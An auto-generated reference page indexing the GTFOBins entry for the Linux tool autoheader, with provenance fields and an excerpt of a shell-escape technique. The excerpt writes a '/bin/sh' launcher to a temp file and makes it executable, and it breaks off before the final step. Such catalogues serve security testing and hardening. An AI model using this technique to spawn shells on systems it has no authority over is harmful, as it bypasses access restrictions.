---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# autoheader

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `autoheader` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/autoheader` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for autoheader covering shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/autoheader.md)
- Source verification: [source record](../../sources/gtfobins/autoheader.md)

## Aliases

- `autoheader`

## Source Verification

[source record](../../sources/gtfobins/autoheader.md)

## Evidence Excerpt

```text
_body: ''
_name: autoheader
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/autoheader
functions:
shell:
- code: 'echo ''/bin/sh 1>&0'' >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
```
